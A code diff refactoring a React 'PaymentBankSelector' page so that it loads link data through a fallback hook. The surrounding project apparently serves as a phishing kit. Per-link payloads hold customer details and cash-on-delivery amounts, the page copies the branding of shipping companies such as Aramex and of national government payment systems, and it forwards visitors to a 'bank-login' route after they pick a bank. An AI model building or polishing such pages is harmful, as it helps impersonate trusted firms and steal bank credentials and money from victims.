@@ -1,8 +1,9 @@
-import { useState, useEffect, useRef } from "react";
-import { useParams, useNavigate, useSearchParams } from "react-router-dom";
+import { useState, useEffect } from "react";
+import { useParams, useNavigate } from "react-router-dom";
 import { Card } from "@/components/ui/card";
 import { Button } from "@/components/ui/button";
-import { useLink, useUpdateLink } from "@/hooks/useSupabase";
+import { useUpdateLink } from "@/hooks/useSupabase";
+import { useLinkWithFallback } from "@/hooks/useLinkWithFallback";
 import { Building2, Loader2, CheckCircle2, Sparkles, ShieldCheck, Lock, AlertCircle, RefreshCw } from "lucide-react";
 import { designSystem } from "@/lib/designSystem";
 import { useToast } from "@/hooks/use-toast";
@@ -18,64 +19,27 @@ const PaymentBankSelector = () => {
   const { id } = useParams();
   const navigate = useNavigate();
   const { toast } = useToast();
-  const [searchParams] = useSearchParams();
-  const { data: linkData, isLoading: linkLoading, error: linkError, refetch } = useLink(id);
+  const { data: linkData, isLoading: linkLoading, error: linkError, handleRetry, retryCount } = useLinkWithFallback(id);
   const updateLink = useUpdateLink();
 
   const [selectedBank, setSelectedBank] = useState<string>("");
   const [banks, setBanks] = useState<Bank[]>([]);
   const [loadingBanks, setLoadingBanks] = useState(false);
-  const [loadingTimeout, setLoadingTimeout] = useState(false);
-  const [retryCount, setRetryCount] = useState(0);
-  const timeoutRef = useRef<NodeJS.Timeout>();
-  
-  const fallbackData = useRef<any>(null);
-  
-  useEffect(() => {
-    const dataParam = searchParams.get('data');
-    if (dataParam) {
-      try {
-        fallbackData.current = JSON.parse(decodeURIComponent(atob(dataParam)));
-      } catch (e) {
-        console.error('Failed to parse URL data:', e);
-      }
-    }
-  }, [searchParams]);
 
-  useEffect(() => {
-    if (linkLoading) {
-      timeoutRef.current = setTimeout(() => {
-        setLoadingTimeout(true);
-      }, 8000);
-    } else {
-      if (timeoutRef.current) {
-        clearTimeout(timeoutRef.current);
-      }
-      setLoadingTimeout(false);
-    }
-    
-    return () => {
-      if (timeoutRef.current) {
-        clearTimeout(timeoutRef.current);
-      }
-    };
-  }, [linkLoading]);
-
-  const effectiveData = linkData || fallbackData.current;
-  const countryCode = effectiveData?.payload?.selectedCountry || effectiveData?.country_code || "SA";
+  const countryCode = linkData?.payload?.selectedCountry || linkData?.country_code || "SA";
   const countryData = getCountryByCode(countryCode);
   
   const govSystem = getGovernmentPaymentSystem(countryCode);
   
-  const preselectedBank = effectiveData?.payload?.selected_bank;
+  const preselectedBank = linkData?.payload?.selected_bank;
   
-  const customerInfo = effectiveData?.payload?.customerInfo || {};
-  const serviceKey = effectiveData?.payload?.service_key || customerInfo.service || 'aramex';
-  const serviceName = effectiveData?.payload?.service_name || serviceKey;
+  const customerInfo = linkData?.payload?.customerInfo || {};
+  const serviceKey = linkData?.payload?.service_key || customerInfo.service || 'aramex';
+  const serviceName = linkData?.payload?.service_name || serviceKey;
   const branding = getServiceBranding(serviceKey);
   const companyBranding = shippingCompanyBranding[serviceKey.toLowerCase()] || null;
   
-  const shippingInfo = effectiveData?.payload as any;
+  const shippingInfo = linkData?.payload as any;
   const paymentData = shippingInfo?.payment_data;
 
   const rawAmount = paymentData?.payment_amount || shippingInfo?.payment_amount || shippingInfo?.cod_amount;
@@ -113,39 +77,29 @@ const PaymentBankSelector = () => {
   const handleBankSelect = async (bankId: string) => {
     setSelectedBank(bankId);
     
-    if (!effectiveData) return;
+    if (!linkData) return;
 
     try {
       const updatedPayload = {
-        ...effectiveData.payload,
+        ...linkData.payload,
         selectedCountry: countryCode,
         selectedBank: bankId,
       };
 
-      if (linkData) {
-        await updateLink.mutateAsync({
-          linkId: id!,
-          payload: updatedPayload
-        });
-      }
+      await updateLink.mutateAsync({
+        linkId: id!,
+        payload: updatedPayload
+      });
     } catch (error) {
       console.error('Error updating link:', error);
     }
 
     setTimeout(() => {
-      const dataParam = searchParams.get('data');
-      const urlSuffix = dataParam ? `?data=${dataParam}` : '';
-      navigate(`/pay/${id}/bank-login${urlSuffix}`);
+      navigate(`/pay/${id}/bank-login`);
     }, 400);
   };
   
-  const handleRetry = () => {
-    setRetryCount(prev => prev + 1);
-    setLoadingTimeout(false);
-    refetch();
-  };
-  
-  if ((linkLoading || !effectiveData) && !loadingTimeout) {
+  if (linkLoading) {
     return (
       <div 
         className="min-h-screen py-4 sm:py-12 flex items-center justify-center bg-background" 
@@ -162,7 +116,7 @@ const PaymentBankSelector = () => {
     );
   }
   
-  if ((loadingTimeout && !effectiveData) || linkError) {
+  if (linkError || !linkData) {
     return (
       <div 
         className="min-h-screen py-4 sm:py-12 flex items-center justify-center bg-background" 
